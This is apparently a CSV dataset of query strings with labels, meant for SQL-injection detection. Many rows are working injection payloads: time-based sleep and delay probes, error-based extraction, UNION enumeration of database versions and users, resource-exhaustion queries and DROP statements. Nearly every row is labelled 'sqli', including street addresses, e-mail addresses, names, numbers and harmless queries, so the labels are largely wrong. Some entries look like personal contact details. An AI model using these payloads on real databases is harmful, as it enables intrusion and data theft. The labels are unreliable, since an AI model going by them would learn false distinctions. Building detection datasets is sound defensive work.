query,label
mccollon@irmedia.ca,sqli
santa catalina 81,sqli
"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",sqli
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""oyou""  =  ""oyou",sqli
SELECT * FROM sound WHERE stove = 'empty' LIMIT 3,sqli
"1  )   as keog where 8033  =  8033 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",sqli
"  SELECT leg,group,travel FROM shelter LEFT JOIN Orders ON chest.solidID =  could.frozen ORDER BY fear.so",sqli
SELECT * FROM wp_posts WHERE ID  =  367808 LIMIT 1,sqli
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",sqli
SELECT tonight ( s )  FROM population FULL OUTER JOIN,sqli
"1%"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
winstanley@waterflyesp.hn,sqli
SELECT AVG ( article ) FROM needed SELECT SUM ( height ) ,sqli
SELECT * FROM us WHERE history = 'his'  OR enough = 'indeed',sqli
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",sqli
"1  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
SELECT * FROM keep FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM garden,sqli
romanones,sqli
SELECT * FROM just WHERE Price NOT BETWEEN 10 AND 20,sqli
SELECT * FROM accident WHERE likely BETWEEN 'hardly' AND 'command',sqli
1'||  (  select 'hwdj' where 8179  =  8179,sqli
"1""   )    )    as rrms where 8185  =  8185 union all select null,null,null,null,null,null,null,null--",sqli
SELECT * FROM choose WHERE straw = 'wire' LIMIT 3,sqli
1'  )   where 7537  =  7537 and 2006  =  2006,sqli
SELECT flight ( s )  FROM basis UNION ALL,sqli
" select * from users where id  =  '1' or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",sqli
SELECT * FROM castle FETCH FIRST 50 PERCENT ROWS ONLY,sqli
SELECT * FROM smoke WHERE chief NOT LIKE '[ought]%',sqli
caaveruelas,sqli
1 and 7533  =  7533# absp,sqli
10328,sqli
"SELECT column1 , column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC;",sqli
"1',  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",sqli
SELECT AVG ( wheel ) FROM these SELECT SUM ( official ) ,sqli
1  )   where 3030  =  3030,sqli
16c64si30,sqli
SELECT * FROM wp_posts WHERE ID  =  28614 LIMIT 1,sqli
SELECT TOP 50 PERCENT * FROM Customers,sqli
saiz,sqli
calle virgen de la macarena 72 2-c,sqli
ianace,sqli
"san petersburgo, 165",sqli
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh",sqli
SELECT MIN ( making )  AS minerals FROM plural,sqli
"-9871""  )   union all select 9082#",sqli
pozal de gallinas,sqli
SELECT * FROM made WHERE connected NOT BETWEEN 'aboard' AND 'aware',sqli
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',sqli
SELECT easier ( s FROM giving RIGHT JOIN,sqli
"  SELECT fear,remember FROM ought WHERE central = 'duty' UNION SELECT exchange, among FROM hour",sqli
1418,sqli
"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--",sqli
"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",sqli
-8828%'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  '%'  =  ',sqli
5arneci052,sqli
1'+  (  select 'qbdh' where 4006  =  4006 and 7533  =  7533  )  +',sqli
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sqli
"1""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""umfr"" like ""umfr",sqli
"1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sqli
-3566%' or 2158  =  6289,sqli
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
90946866j,sqli
-6217   )    )    as hyws where 3441  =  3441 or 9421  =  4695#,sqli
 (  select   (  case when   (  6461  =  1802  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,sqli
SELECT COUNT ( impossibleID ) FROM belt,sqli
44923287d,sqli
"SELECT * FROM pole WHERE fifty BETWEEN ""floor"" AND    ""neck""",sqli
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'sqni' like 'sqni",sqli
fit irizibar,sqli
SELECT TOP 3 * FROM wild WHERE laid = 'same' SELECT * FROM provide,sqli
"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",sqli
SELECT * FROM rubbed FETCH FIRST 3 ROWS ONLY,sqli
"1"" union all select null--",sqli
SELECT AVG ( horn ) FROM until SELECT SUM ( typical ) ,sqli
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_2710' LIMIT 1,sqli
SELECT cloth FROM kept,sqli
"c/ caamaque, 15, 4-g",sqli
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""ewsr"" like ""ewsr",sqli
SELECT * FROM drew WHERE NOT fuel = 'soldier'  AND NOT scene = 'chicken',sqli
" SELECT * FROM this ORDER BY older ASC, clearly DESC",sqli
SELECT * FROM aid WHERE    NOT wealth = 'long',sqli
SELECT TOP 3 * FROM been,sqli
SELECT COUNT ( wise )  FROM dozen,sqli
SELECT * FROM father WHERE situation LIKE '%belong%',sqli
"1"" where 5372  =  5372 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
"1' in boolean mode  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
SELECT AVG ( wrote )  FROM straw  SELECT SUM ( love ) ,sqli
8554610000000000,sqli
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'nepn'  =  'nepn",sqli
"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
"  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",sqli
FROM  ( SELECT DISTINCT species FROM identity ) ,sqli
SELECT color FROM perhaps,sqli
SELECT instrument FROM way UNION SELECT vast FROM sport ORDER BY rubber,sqli
SELECT * FROM  ( SELECT thou FROM pleasant ) ,sqli
SELECT AVG ( therefore ) FROM average,sqli
SELECT drawn ( s ) FROM closer INNER JOIN,sqli
c/ mayolica 158 4a,sqli
1'+  (  select 'qxmo' where 9511  =  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sqli
"-2377%'   )    )     )   union all select 7706,7706--",sqli
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",sqli
"SELECT * FROM report WHERE kept BETWEEN ""powerful"" AND    ""route""",sqli
"  UPDATE camp SET right =  'forest', City =  'young' WHERE main =  ring",sqli
bret3,sqli
33744160d,sqli
"-6848""   )    )    or 4071  =  5312",sqli
" SELECT * FROM already ORDER BY hospital ASC, gone DESC",sqli
"-6815 where 7609  =  7609 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
nacer,sqli
SELECT TOP 3 * FROM climate SELECT * FROM rate 3SELECT * FROM show,sqli
SELECT within ( s )  FROM map UNION ALL,sqli
5240,sqli
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",sqli
"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sqli
"  SELECT closelyID AS ID, base AS depend FROM experiment",sqli
"  SELECT REPEAT ( ""SQL Tutorial"", 3 ) ;",sqli
SELECT AVG ( milk ) FROM than,sqli
1' and 1541  =  6868#,sqli
SELECT * FROM entire FETCH FIRST 50 PERCENT ROWS ONLY,sqli
corota,sqli
"1  )   where 9432  =  9432 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
SELECT * FROM sink  WHERE steel = now,sqli
"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",sqli
SELECT option_value FROM wp_options WHERE option_name  =  '_options_linkedin_url' LIMIT 1,sqli
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",sqli
yee,sqli
43511,sqli
"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",sqli
SELECT * FROM voice WHERE production BETWEEN '1996-07-01' AND '1996-07-31',sqli
carablanca,sqli
"-4015"" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
"1   )    )    as oqfr where 6426  =  6426 and make_set  (  8403  =  8403,8899  )  --",sqli
desc,sqli
"silo 179, 12?b",sqli
SELECT nature ( s FROM yesterday RIGHT JOIN,sqli
SELECT TOP 50 PERCENT * FROM bottle SELECT * FROM addition FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM son,sqli
"create or replace function sleep  (  int  )   returns int as '/lib/libc.so.6','sleep' language 'c' strict",sqli
"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",sqli
SELECT TOP 50 PERCENT * FROM pretty SELECT * FROM football FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM airplane,sqli
1'+  (  select 'ezpy' where 5282  =  5282 order by 1#,sqli
2946,sqli
SELECT * FROM men WHERE calm = 'feature',sqli
16,sqli
"1 and make_set  (  8403  =  8403,8899  )  ",sqli
5498,sqli
93698052p,sqli
SELECT * FROM personal 3,sqli
e57ol40,sqli
SELECT Count ( * )  AS movement,sqli
"1"" and sleep  (  5  )  #",sqli
"c/ afrodita 160, 5?b",sqli
SELECT AVG ( upon )  FROM farm  SELECT SUM ( dust ) ,sqli
"-5572""  )   union all select 8131,8131#",sqli
SELECT TOP 50 PERCENT * FROM whatever,sqli
SELECT listen ( s )  FROM courage SELECT eaten FROM his,sqli
"   SELECT COUNT ( sea ) , gasoline FROM fine BY kept",sqli
"consolacion 92, 12?h",sqli
SELECT TOP 50 PERCENT * FROM box SELECT * FROM fellow FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chemical,sqli
villargordo del cabriel,sqli
SELECT * FROM term  WHERE driving NOT LIKE '[atmosphere]%',sqli
0 or 1  =  1,sqli
"1%' and elt  (  7619  =  1489,1489  )   and '%'  =  '",sqli
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,sqli
SELECT TOP 3 * FROM split,sqli
"  SELECT color AS enjoy, broke AS [both]  FROM television",sqli
SELECT * FROM  ( SELECT life FROM paid ) ,sqli
1' where 3188  =  3188 and 9198  =  9198--,sqli
1'  )   where 8163  =  8163,sqli
SELECT review ( s )  FROM powder UNION ALL,sqli
brogley,sqli
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  'Brazil'; DROP VIEW view_name ; DROP VIEW [Brazil Customers];",sqli
"calle florian de ocampo 114, 7?h",sqli
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",sqli
wittik,sqli
SELECT * FROM made WHERE group = 'crop' FETCH FIRST 3 ROWS ONLY,sqli
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY,sqli
FROM  ( SELECT DISTINCT low FROM wish ) ,sqli
"1%'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",sqli
bellaguarda,sqli
select   (  case when   (  9455  =  6007  )   then 9455 else 9455*  (  select 9455 from mysql.db  )   end  )  #,sqli
SELECT * FROM than WHERE peace = 'care' LIMIT 3,sqli
SELECT * FROM jack,sqli
"1,  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",sqli
zubicueta vallb,sqli
"c/ relfas 122,",sqli
SELECT electric ( s )  FROM equally UNION,sqli
8160000000000000,sqli
-7072'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,sqli
"-8684 union all select 9519,9519,9519,9519--",sqli
SELECT * FROM highway WHERE lucky = 'felt'  OR necessary = 'classroom',sqli
"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",sqli
SELECT TOP 3 * FROM simple WHERE especially = 'frame' SELECT * FROM kind,sqli
"1%'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",sqli
"select * from generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   limit 1--",sqli
cretas,sqli
SELECT congress ( s ) FROM shirt INNER JOIN,sqli
p563l5os1,sqli
SELECT * FROM board WHERE cloth = 'selection'  AND City = 'add',sqli
SELECT TOP 3 * FROM afternoon SELECT * FROM bark 3SELECT * FROM light,sqli
"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",sqli
"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",sqli
"-9175'   )    )    union all select 6174,6174,6174,6174--",sqli
" SELECT * FROM positive ORDER BY human ASC, pleasure DESC",sqli
-8233' or 9538  =  1882#,sqli
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',sqli
SELECT AVG ( begun ) FROM low,sqli
SELECT * FROM yet,sqli
-1492 where 2788  =  2788 union all select 2788#,sqli
SELECT * FROM cup 3 SELECT * FROM jungle,sqli
DELETE FROM tight,sqli
-3062'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth,sqli
"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",sqli
segovia,sqli
SELECT * FROM rise WHERE loss = 'nodded'  OR month = 'adjective',sqli
SELECT TOP 3 * FROM sell,sqli
"INSERT INTO lips  ( smaller, solve, musical )  VALUES  ( 'gate', 'doll', 'baseball' )  ",sqli
"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",sqli
SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM lion,sqli
"mesas, las",sqli
"1  )   where 3915  =  3915 union all select null,null,null,null#",sqli
"  SELECT feelID AS ID, sick AS flag FROM possible",sqli
SELECT * FROM day WHERE NOT powerful = 'married'  AND NOT stepped = 'plan',sqli
"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",sqli
SELECT reach ( s ) FROM rear INNER JOIN,sqli
"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13278 )  ORDER BY meta_id ASC",sqli
"-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --",sqli
6ab48t1r,sqli
t16564l,sqli
"  SELECT are AS rod, fence AS [worker]  FROM swung",sqli
"  SELECT POWER ( 4, 2 ) ;",sqli
SELECT * FROM useful WHERE immediately = 'series'  AND City = 'problem',sqli
oretana,sqli
"1'   )    )     )   union all select null,null,null,null#",sqli
"  SELECT familiarID AS ID, ancient AS daughter FROM paper",sqli
SELECT youth ( s FROM constantly RIGHT JOIN,sqli
6572,sqli
braham,sqli
"  SELECT instrument,pet FROM usually WHERE think = 'whose' UNION SELECT paper, free FROM larger",sqli
"   SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper  FROM sharp",sqli
" select * from users where id  =  1 or "";&"" or 1  =  1 -- 1",sqli
"  SELECT forgot,becoming,health FROM bag LEFT JOIN Orders ON island.experienceID =  cast.keep ORDER BY dream.reach",sqli
mcallum,sqli
hotson,sqli
"  SELECT coffee AS sun, coast AS [already]  FROM ruler",sqli
SELECT * FROM creature,sqli
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28545 )  ORDER BY meta_id ASC",sqli
SELECT * FROM member FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM balloon,sqli
"   SELECT apart, single, remarkable FROM fox WHERE activity  IS NULL",sqli
"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",sqli
"1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#",sqli
SELECT * FROM method WHERE thought NOT LIKE '[police]%',sqli
SELECT * FROM thou WHERE attention = 'rays' LIMIT 3,sqli
SELECT * FROM toward FETCH FIRST 50 PERCENT ROWS ONLY,sqli
SELECT * FROM other WHERE spread NOT BETWEEN 'supply' AND 'barn',sqli
eu,sqli
"-9535"" order by 1--",sqli
o+bispar,sqli
SELECT * FROM serious FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM few,sqli
1'   )    )    as qovd where 8865  =  8865 and   (  3020  =  3020  )  *6703--,sqli
SELECT DISTINCT fuel FROM substance,sqli
3440,sqli
"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",sqli
"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
"  SELECT INSERT ( ""W3Schools.com"", 1, 9, ""Example"" ) ;",sqli
"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",sqli
"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",sqli
"1""  )   where 1212  =  1212 and 8475  =  5864",sqli
"1%""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",sqli
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,sqli
SELECT time FROM flies,sqli
"isabelita ruiz, 31",sqli
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",sqli
"-4522""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mbkq""  =  ""mbkq",sqli
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""eakt"" like ""eakt",sqli
SELECT AVG ( student )  FROM cabin  SELECT SUM ( led ) ,sqli
"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",sqli
SELECT * FROM gun WHERE thy = 'surface'  OR compass = 'total',sqli
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  1248  =  1248,sqli
SELECT COUNT ( earth ) FROM animal,sqli
"  UPDATE until SET column =  'attached', City =  'coat' WHERE rather =  wing",sqli
"jose gomez gallito, 107,",sqli
1 waitfor delay '0:0:5'--,sqli
"  SELECT Orders.hairrID, Employees.ranch, Employees.teacher FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.askID ORDER BY Orders.knifeID",sqli
"1""  )   where 2633  =  2633 union all select null,null,null,null#",sqli
dobrescu_brizzard@enigmatico.so,sqli
"alqueria de coca 38,",sqli
" or 1  =  1 or """"  =  ",sqli
SELECT * FROM explore WHERE with = 'affect' LIMIT 3,sqli
"1%' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
" SELECT * FROM package ORDER BY headed ASC, word DESC",sqli
SELECT * FROM heading WHERE tie = 'nearer',sqli
SELECT * FROM birth WHERE organization = 'consonant',sqli
SELECT * FROM man WHERE prove IN  ( SELECT are FROM way ) ,sqli
"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,sqli
SELECT * FROM provide WHERE parallel = 'wore'  OR cowboy = 'leaving',sqli
"-8002'   )    )     )   union all select 6647,6647,6647--",sqli
SELECT * FROM crop WHERE yet BETWEEN '1996-07-01' AND '1996-07-31',sqli
1' where 6583  =  6583,sqli
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",sqli
ardevol herrador,sqli
"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",sqli
geffner-schoo@bacoespecialseleccin.bm,sqli
SELECT cutting ( s )  FROM other,sqli
3290000000000000,sqli
-9202' where 9799  =  9799 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,sqli
SELECT * FROM north WHERE church = 'especially',sqli
robieux,sqli
1'+  (  select 'ueak' where 7329  =  7329 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',sqli
1'||  (  select 'cfff' where 4994  =  4994,sqli
SELECT TOP 50 PERCENT * FROM obtain SELECT * FROM section FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM basket,sqli
SELECT COUNT(*) FROM orders WHERE status='pending',benign
" select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",sqli
70243797a,sqli
9004540000000000,sqli
casasnova vadal,sqli
|,sqli
SELECT MIN ( recent )  AS bring FROM sense,sqli
